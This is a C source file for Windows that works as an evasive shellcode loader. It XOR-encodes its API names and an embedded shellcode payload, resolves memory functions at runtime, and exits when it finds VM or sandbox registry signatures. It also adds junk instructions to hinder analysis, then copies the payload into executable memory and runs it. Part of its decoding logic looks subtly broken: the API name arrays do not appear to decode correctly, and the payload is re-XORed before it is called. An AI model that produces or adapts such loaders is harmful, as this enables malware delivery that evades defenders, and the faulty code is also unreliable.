#include <stdio.h>
#include <windows.h>
#include "functions.h"

// Define XOR key parts for encryption/decryption
#define XOR_KEY_PART1 0xA5
#define XOR_KEY_PART2 0x0F

// Encrypted keys and function names
unsigned char key_part1[] = {XOR_KEY_PART1, 0x00, 0x00, 0x00};
unsigned char key_part2[] = {XOR_KEY_PART2, 0x00, 0x00, 0x00};

unsigned char encVirtualAlloc[] = {0xD2, 0x82, 0x91, 0x80, 0x9C, 0x91, 0x9C, 0x8C, 0x89, 0x80, 0x8A, 0x91, 0x83, 0x00};
unsigned char encRtlMoveMemory[] = {0xD2, 0x89, 0x93, 0x80, 0x9E, 0x8A, 0x83, 0xD2, 0x82, 0x91, 0x80, 0x9C, 0x91, 0x9C, 0x8C, 0x89, 0x80, 0x8A, 0x91, 0x83, 0x00};

// Calculate the XOR key
unsigned char calculate_xor_key() {
    return key_part1[0] ^ key_part2[0];
}

// XOR decryption function
void xor_decrypt(unsigned char *data, size_t len, unsigned char key) {
    for (size_t i = 0; i < len; i++) {
        data[i] ^= key;
        if (i % 2 == 0) __asm__("nop");  // Insert junk instruction to obfuscate analysis
    }
}

// Decrypt a string using XOR
void decrypt_xor_string(unsigned char *str, unsigned char key) {
    while (*str) {
        *str ^= key;
        str++;
        if (rand() % 4 == 0) __asm__("nop");
    }
}

// Check for common sandbox/virtualization environments
int detect_sandbox() {
    char *sandbox_env[] = { "VIRTUALBOX", "VMWARE", "QEMU", "XEN" };
    HKEY hKey;
    char buffer[1024];
    DWORD bufferSize = sizeof(buffer);
    
    for (int i = 0; i < sizeof(sandbox_env) / sizeof(sandbox_env[0]); i++) {
        if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SYSTEM\\ControlSet001\\Services\\Disk\\Enum", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            if (RegQueryValueEx(hKey, "0", NULL, NULL, (LPBYTE)buffer, &bufferSize) == ERROR_SUCCESS) {
                if (strstr(buffer, sandbox_env[i])) {
                    RegCloseKey(hKey);
                    return 1;  // Sandbox detected
                }
            }
            RegCloseKey(hKey);
        }
    }
    return 0;  // No sandbox detected
}

unsigned char* load_shellcode(size_t *len) {
    unsigned char shellcode[] = "\x56\xe2\x2b\x4e\x5a\x55\x55\x55\x42\x7a\xaa\xaa\xaa\xeb\xfb\xeb\xfa\xf8\xfb\xfc\xe2\x9b\x78\xcf\xe2\x21\xf8\xca\x94\xe2\x21\xf8\xb2\x94\xe2\x21\xf8\x8a\x94\xe2\x21\xd8\xfa\x94\xe2\xa5\x1d\xe0\xe0\xe7\x9b\x63\xe2\x9b\x6a\x06\x96\xcb\xd6\xa8\x86\x8a\xeb\x6b\x63\xa7\xeb\xab\x6b\x48\x47\xf8\xeb\xfb\x94\xe2\x21\xf8\x8a\x94\x21\xe8\x96\xe2\xab\x7a\x94\x21\x2a\x22\xaa\xaa\xaa\xe2\x2f\x6a\xde\xc5\xe2\xab\x7a\xfa\x94\x21\xe2\xb2\x94\xee\x21\xea\x8a\xe3\xab\x7a\x49\xf6\xe2\x55\x63\x94\xeb\x21\x9e\x22\xe2\xab\x7c\xe7\x9b\x63\xe2\x9b\x6a\x06\xeb\x6b\x63\xa7\xeb\xab\x6b\x92\x4a\xdf\x5b\x94\xe6\xa9\xe6\x8e\xa2\xef\x93\x7b\xdf\x7c\xf2\x94\xee\x21\xea\x8e\xe3\xab\x7a\xcc\x94\xeb\x21\xa6\xe2\x94\xee\x21\xea\xb6\xe3\xab\x7a\x94\xeb\x21\xae\x22\xe2\xab\x7a\xeb\xf2\xeb\xf2\xf4\xf3\xf0\xeb\xf2\xeb\xf3\xeb\xf0\xe2\x29\x46\x8a\xeb\xf8\x55\x4a\xf2\xeb\xf3\xf0\x94\xe2\x21\xb8\x43\xe3\x55\x55\x55\xf7\x94\xe2\x27\x27\x8b\xab\xaa\xaa\xeb\x10\xe6\xdd\x8c\xad\x55\x7f\xe3\x6d\x6b\xaa\xaa\xaa\xaa\x94\xe2\x27\x3f\xa4\xab\xaa\xaa\x94\xe6\x27\x2f\xb1\xab\xaa\xaa\xe2\x9b\x63\xeb\x10\xef\x29\xfc\xad\x55\x7f\xe2\x9b\x63\xeb\x10\x5a\x1f\x08\xfc\x55\x7f\xe2\xcf\xc6\xc6\xc5\x86\x8a\xdd\xc5\xd8\xc6\xce\xaa\xe2\xcf\xc6\xc6\xc5\xaa\xdf\xd9\xcf\xd8\x99\x98\x84\xce\xc6\xc6\xaa\xaa";
    *len = sizeof(shellcode);

    unsigned char *allocated_shellcode = (unsigned char*)malloc(*len);
    if (!allocated_shellcode) return NULL;

    memcpy(allocated_shellcode, shellcode, *len);

    return allocated_shellcode;
}

// Execute the decrypted shellcode
int execute_shellcode() {
    unsigned char xor_key = calculate_xor_key();

    // Decrypt the encrypted API strings
    decrypt_xor_string(encVirtualAlloc, xor_key);
    decrypt_xor_string(encRtlMoveMemory, xor_key);

    // Resolve function addresses dynamically
    HMODULE hKernel32 = LoadLibrary("kernel32.dll");
    HMODULE hNtdll = LoadLibrary("ntdll.dll");

    void* (*pVirtualAlloc)(void*, SIZE_T, DWORD, DWORD) = (void* (*)(void*, SIZE_T, DWORD, DWORD))GetProcAddress(hKernel32, (char*)encVirtualAlloc);
    void (*pRtlMoveMemory)(void*, const void*, SIZE_T) = (void (*)(void*, const void*, SIZE_T))GetProcAddress(hNtdll, (char*)encRtlMoveMemory);

    if (!pVirtualAlloc || !pRtlMoveMemory) {
        return 1;
    }

    // Anti-sandbox check
    if (detect_sandbox()) {
        return 1;
    }

    // Load and decrypt shellcode
    size_t shellcode_len;
    unsigned char *shellcode = load_shellcode(&shellcode_len);
    if (!shellcode) {
        return 1;
    }

    xor_decrypt(shellcode, shellcode_len, xor_key);

    // Allocate memory and move shellcode
    void *exec = pVirtualAlloc(0, shellcode_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (exec == NULL) {
        free(shellcode);
        return 1;
    }

    pRtlMoveMemory(exec, shellcode, shellcode_len);
    free(shellcode);

    // Self-modifying code: modify the shellcode before execution
    unsigned char *modifier = (unsigned char *)exec;
    for (size_t i = 0; i < shellcode_len; i++) {
        modifier[i] ^= xor_key;
        if (rand() % 2 == 0) __asm__("nop");  // Junk instruction to obfuscate analysis
    }

    // Execute the shellcode
    void (*func)() = (void (*)())exec;

    func();

    return 0;
}